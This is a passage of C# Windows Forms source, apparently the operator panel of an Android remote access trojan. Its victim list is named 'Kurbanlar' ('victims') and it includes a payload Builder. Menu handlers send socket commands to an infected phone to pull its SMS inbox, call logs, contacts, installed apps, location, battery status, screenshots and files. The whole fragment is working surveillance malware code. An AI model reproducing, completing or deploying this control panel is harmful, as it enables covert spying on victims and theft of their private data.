            return list.First();
        }
        public Kamera FİndKameraById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Kamera>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public CagriKayitlari FindCagriById(string ident)
        {
            var list = Application.OpenForms
          .OfType<CagriKayitlari>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Ayarlar FindAyarlarById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Ayarlar>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Uygulamalar FindUygulamalarById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Uygulamalar>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Bilgiler FindBilgiById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Bilgiler>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Konum FindKonumById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Konum>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public Eglence FindEglenceById(string ident)
        {
            var list = Application.OpenForms
          .OfType<Eglence>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        public DownloadManager FindDownloadManagerById(string ident)
        {
            var list = Application.OpenForms
          .OfType<DownloadManager>()
          .Where(form => string.Equals(form.ID, ident))
           .ToList();
            return list.First();
        }
        private void sMSYöneticisiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        SMSYoneticisi sMS = new SMSYoneticisi(kurban.soket, kurban.id);
                        sMS.Show();
                        byte[] gidecek = Encoding.UTF8.GetBytes("GELENKUTUSU|");
                        Gonderici.Send(kurban.soket, gidecek, 0, gidecek.Length, 59999);
                    }
                }
            }
        }
        private void çağrıKayıtlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        CagriKayitlari sMS = new CagriKayitlari(kurban.soket, kurban.id);
                        sMS.Show();
                        byte[] gidecek = Encoding.UTF8.GetBytes("CALLLOGS|");
                        Gonderici.Send(kurban.soket, gidecek, 0, gidecek.Length, 59999);
                    }
                }
            }
        }

        private void telefonAyarlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Ayarlar sMS = new Ayarlar(kurban.soket, kurban.id);
                        sMS.Show();
                        byte[] bilgiler = Encoding.UTF8.GetBytes("VOLUMELEVELS|");
                        Gonderici.Send(kurban.soket, bilgiler, 0, bilgiler.Length, 59999);
                    }
                }
            }
        }

        private void rehberToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Rehber sMS = new Rehber(kurban.soket, kurban.id);
                        sMS.Show();
                        byte[] bayt = Encoding.UTF8.GetBytes("REHBERIVER|");
                        Gonderici.Send(kurban.soket, bayt, 0, bayt.Length, 59999);
                    }
                }
            }
        }

        private void eğlencePaneliToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Eglence eglence = new Eglence(kurban.soket, kurban.id);
                        eglence.Show();
                        //byte[] bayt = Encoding.UTF8.GetBytes("PARLAKLIK|");
                        //Gonderici.Send(kurban.soket, bayt, 0, bayt.Length, 59999);
                    }
                }
            }
        }
        private void uygulamaListesiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Uygulamalar eglence = new Uygulamalar(kurban.soket, kurban.id);
                        eglence.Show();
                        byte[] gonder = Encoding.UTF8.GetBytes("APPLICATIONS|");
                        Gonderici.Send(kurban.soket, gonder, 0, gonder.Length, 59999);
                    }
                }
            }
        }

        private void telefonDurumuToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 1)
            {
                foreach (Kurbanlar kurban in kurban_listesi)
                {
                    if (kurban.id == listView1.SelectedItems[0].Text)
                    {
                        Bilgiler eglence = new Bilgiler(kurban.soket, kurban.id);
                        eglence.Show();
                        byte[] gonder = Encoding.UTF8.GetBytes("SARJ|");
                        Gonderici.Send(kurban.soket, gonder, 0, gonder.Length, 59999);
                    }
                }
            }
        }
        private void oluşturToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Builder().Show();
        }

        private void hakkındaToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Hakkinda().Show();
        }

        private void konumToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    Konum knm = new Konum(kurban.soket, kurban.id);
                    knm.Show();
                    byte[] gonder = Encoding.UTF8.GetBytes("KONUM|");
                    Gonderici.Send(kurban.soket, gonder, 0, gonder.Length, 59999);
                }
            }
        }

        private void ayarlarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            new Settings().Show();
        }

        private void dosyaİndirtToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    DownloadManager dwn = new DownloadManager(kurban.soket, kurban.id);
                    dwn.Show();
                }
            }
        }

        private void ekranGörüntüsüToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    EkranGoruntusu dwn = new EkranGoruntusu(kurban.soket, kurban.id);
                    dwn.Show();
                }
            }
        }

        private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            e.Graphics.FillRectangle(Brushes.Red, e.Bounds);
            e.DrawText();
        }

        private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }
    }
}